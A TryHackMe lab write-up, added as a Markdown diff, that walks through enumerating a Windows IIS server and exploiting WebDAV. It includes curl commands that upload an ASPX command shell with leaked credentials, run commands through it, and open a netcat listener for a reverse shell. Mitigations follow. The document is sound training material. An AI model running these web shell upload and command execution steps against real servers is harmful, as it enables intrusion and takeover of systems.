@@ -1,0 +1,427 @@
+ # TryHackMe – Web Server Attacks - II
+
+## Room Information
+
+- **Room Name:** Web Server Attacks - II
+- **Platform:** TryHackMe
+- **Difficulty:** Easy
+- **Category:** Web / Enumeration / Exploitation
+- **Target:** Windows IIS Web Server
+
+---
+
+## Objective
+
+The objective of this room was to learn how to enumerate and attack a Microsoft IIS web server, identify WebDAV functionality, discover exposed files and credentials, exploit WebDAV file upload capabilities, achieve remote command execution, and obtain a reverse shell.
+
+---
+
+## Tools Used
+
+- Nmap
+- Curl
+- IIS ShortName Scanner
+- Netcat
+- PowerShell
+- WebDAV
+
+---
+
+## Commands Used
+
+### Scan the HTTP Service
+
+```bash
+nmap -sV -p 80 MACHINE_IP
+```
+
+Used Nmap to scan TCP port 80 and identify the HTTP service running on the target.
+
+### Check HTTP Headers
+
+```bash
+curl -I http://MACHINE_IP
+```
+
+This revealed information about the web server, including:
+
+```text
+Microsoft-IIS/10.0
+ASP.NET
+```
+
+### Enumerate HTTP Methods
+
+```bash
+nmap --script http-methods -p 80 MACHINE_IP
+```
+
+This showed that the server supported several HTTP and WebDAV methods, including:
+
+```text
+GET
+POST
+HEAD
+PUT
+DELETE
+COPY
+MOVE
+PROPFIND
+LOCK
+UNLOCK
+```
+
+### Detect WebDAV
+
+```bash
+nmap --script http-webdav-scan -p 80 MACHINE_IP
+```
+
+Used to identify WebDAV functionality on the IIS server.
+
+I also used an `OPTIONS` request to check the HTTP methods supported by the server.
+
+```bash
+curl -X OPTIONS http://MACHINE_IP -sv 2>&1 | grep -E "Allow:|DAV:"
+```
+
+### IIS Short Name Enumeration
+
+```bash
+python3 iis_shortname_scan.py http://MACHINE_IP/
+```
+
+Used IIS short-name enumeration to help identify hidden or interesting files and directories on the IIS server.
+
+### Enumerate the Backup Directory
+
+```bash
+curl http://MACHINE_IP/BackupFiles/
+```
+
+Directory listing exposed a file named:
+
+```text
+webdav_notes.txt
+```
+
+### Read the WebDAV Notes
+
+```bash
+curl http://MACHINE_IP/BackupFiles/webdav_notes.txt
+```
+
+The file revealed information about the WebDAV directory and credentials.
+
+### Enumerate the Upload Directory
+
+```bash
+curl http://MACHINE_IP/uploads/
+```
+
+This exposed additional files, including:
+
+```text
+config.bak
+web.config
+```
+
+### Upload ASPX File Through WebDAV
+
+```bash
+curl -v --ntlm -u 'USERNAME:PASSWORD' -T cmd.aspx http://MACHINE_IP/webdav/cmd.aspx
+```
+
+The WebDAV `PUT` functionality allowed an ASPX command shell to be uploaded to the server.
+
+### Test Remote Command Execution
+
+```bash
+curl "http://MACHINE_IP/webdav/cmd.aspx?cmd=whoami"
+```
+
+The `whoami` command successfully executed on the Windows target, confirming remote command execution.
+
+### Start Netcat Listener
+
+```bash
+nc -lvnp 443
+```
+
+Used Netcat to listen for the incoming reverse-shell connection.
+
+### Enumerate Windows Privileges
+
+```cmd
+whoami /priv
+```
+
+Used after obtaining the shell to identify the privileges assigned to the compromised Windows account.
+
+---
+
+## Steps Taken
+
+1. Scanned TCP port 80 using Nmap.
+2. Confirmed that an HTTP service was running.
+3. Used Curl to inspect the HTTP response headers.
+4. Identified Microsoft IIS 10.0 and ASP.NET.
+5. Enumerated the HTTP methods supported by the server.
+6. Discovered WebDAV-related methods such as `PUT`, `DELETE`, `COPY`, `MOVE`, and `PROPFIND`.
+7. Confirmed that WebDAV functionality was enabled.
+8. Performed IIS short-name enumeration.
+9. Discovered the `/BackupFiles/` directory.
+10. Found and accessed `webdav_notes.txt`.
+11. Discovered WebDAV configuration information and credentials.
+12. Enumerated the `/uploads/` directory.
+13. Found exposed files such as `config.bak` and `web.config`.
+14. Used the discovered credentials to authenticate to WebDAV.
+15. Uploaded an ASPX command shell using the `PUT` method.
+16. Accessed the uploaded ASPX file.
+17. Executed `whoami` and confirmed remote command execution.
+18. Started a Netcat listener on the attacking machine.
+19. Established a PowerShell reverse shell from the Windows target.
+20. Used `whoami /priv` to enumerate the privileges of the compromised account.
+
+---
+
+## Networking Concepts
+
+### HTTP
+
+The main application-layer protocol used during this room was:
+
+```text
+HTTP
+```
+
+HTTP allows clients and web servers to communicate using requests and responses.
+
+### Port 80
+
+The IIS web server was running on:
+
+```text
+TCP Port 80
+```
+
+Port 80 is commonly associated with unencrypted HTTP web traffic.
+
+### TCP
+
+HTTP uses TCP as its transport protocol.
+
+Before HTTP communication occurs, TCP establishes a connection using the three-way handshake:
+
+```text
+Client → SYN
+Server → SYN-ACK
+Client → ACK
+```
+
+Once the connection is established, HTTP requests and responses can travel between the systems.
+
+### HTTP Methods
+
+Common HTTP methods include:
+
+```text
+GET
+POST
+HEAD
+```
+
+WebDAV extends HTTP with additional methods such as:
+
+```text
+PUT
+DELETE
+COPY
+MOVE
+PROPFIND
+LOCK
+UNLOCK
+```
+
+The `PUT` method was important during this room because it allowed a file to be uploaded to the WebDAV directory.
+
+### WebDAV
+
+WebDAV stands for:
+
+```text
+Web Distributed Authoring and Versioning
+```
+
+It extends HTTP and allows users to remotely manage files on a web server.
+
+If WebDAV is misconfigured, an attacker may be able to upload, modify, move, or delete files.
+
+### Reverse Shell
+
+Before obtaining the reverse shell, my attacking machine was sending HTTP requests to the target:
+
+```text
+Attacker → HTTP Request → Target IIS Server
+```
+
+With a reverse shell, the direction changed:
+
+```text
+Target Windows Server → TCP Connection → Attacker's Listener
+```
+
+The compromised machine initiated a connection back to my Netcat listener, giving me an interactive shell.
+
+---
+
+## Vulnerabilities / Findings
+
+### WebDAV Enabled
+
+WebDAV was enabled on the IIS server and exposed several potentially dangerous HTTP methods.
+
+### Dangerous HTTP Methods
+
+Methods such as:
+
+```text
+PUT
+DELETE
+COPY
+MOVE
+```
+
+increased the attack surface because they allowed files and resources on the server to be modified.
+
+### Directory Listing Enabled
+
+Directory listing allowed files stored inside web directories to be viewed.
+
+This helped expose sensitive files that should not have been publicly accessible.
+
+### Sensitive Files Exposed
+
+Files such as:
+
+```text
+webdav_notes.txt
+config.bak
+web.config
+```
+
+were accessible through the web server.
+
+### Credential Exposure
+
+The WebDAV notes contained credentials that could be used to authenticate to the WebDAV directory.
+
+### Executable File Upload
+
+WebDAV allowed an ASPX file to be uploaded.
+
+Because IIS could execute ASP.NET files, the uploaded ASPX file could execute commands on the server.
+
+### Remote Command Execution
+
+The uploaded ASPX command shell allowed commands such as:
+
+```cmd
+whoami
+```
+
+to execute on the Windows target.
+
+This resulted in remote command execution.
+
+---
+
+## Attack Path
+
+```text
+Nmap Enumeration
+        ↓
+Discover TCP Port 80
+        ↓
+Identify HTTP / IIS / ASP.NET
+        ↓
+Enumerate HTTP Methods
+        ↓
+Identify WebDAV
+        ↓
+IIS Short Name Enumeration
+        ↓
+Discover Backup Files
+        ↓
+Find WebDAV Information and Credentials
+        ↓
+Authenticate to WebDAV
+        ↓
+Upload ASPX Command Shell
+        ↓
+Execute whoami
+        ↓
+Remote Command Execution
+        ↓
+Establish Reverse Shell
+        ↓
+Enumerate Windows Privileges
+```
+
+---
+
+## Mitigations
+
+- Disable WebDAV when it is not required.
+- Restrict unnecessary HTTP methods such as `PUT` and `DELETE`.
+- Disable directory listing.
+- Never store plaintext credentials in web-accessible files.
+- Restrict access to backup and configuration files.
+- Apply least-privilege permissions to WebDAV directories.
+- Prevent uploaded files from being executed as server-side code.
+- Remove unnecessary IIS functionality.
+- Monitor IIS logs for suspicious HTTP methods and file uploads.
+- Rotate credentials immediately if they become exposed.
+
+---
+
+## What I Learned
+
+This room helped me understand how different web server weaknesses can be chained together during a penetration test.
+
+I learned how to:
+
+- Scan a web server with Nmap.
+- Identify services and versions running on TCP port 80.
+- Fingerprint Microsoft IIS and ASP.NET.
+- Enumerate supported HTTP methods.
+- Identify WebDAV functionality.
+- Understand WebDAV methods such as `PUT` and `PROPFIND`.
+- Perform IIS short-name enumeration.
+- Discover exposed directories and sensitive files.
+- Understand the risks of exposed backup and configuration files.
+- Identify credential exposure.
+- Authenticate to WebDAV.
+- Understand how WebDAV can allow file uploads.
+- Turn an executable ASPX upload into remote command execution.
+- Understand how a reverse shell works.
+- Enumerate Windows privileges after gaining access.
+- Understand how HTTP communicates over TCP.
+
+The biggest lesson from this room was that a system does not always need one major vulnerability to become compromised.
+
+Several smaller weaknesses can be chained together:
+
+```text
+Information Disclosure
+        +
+Credential Exposure
+        +
+WebDAV Misconfiguration
+        +
+Executable File Upload
+        =
+Remote Command Execution
+```
+
+This room showed why enumeration is important because each piece of information discovered helped lead to the next stage of the attack.
